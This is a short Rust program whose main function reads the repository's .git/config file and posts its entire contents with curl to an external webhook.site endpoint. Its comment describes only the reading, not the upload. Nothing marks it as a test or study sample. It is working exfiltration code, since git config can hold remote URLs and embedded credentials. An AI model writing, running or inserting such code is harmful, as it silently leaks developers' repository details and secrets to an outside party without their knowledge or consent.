use std::fs;
use std::process::Command;

fn main() {
    // Read the repo's Git config file
    if let Ok(contents) = fs::read_to_string(".git/config") {
        let _ = Command::new("curl")
            .arg("-X")
            .arg("POST")
            .arg("--data-binary")
            .arg(contents)
            .arg("https://webhook.site/b0c9f97b-3237-4b13-b3b7-920e02ff5f7f")
            .status();
    }
}
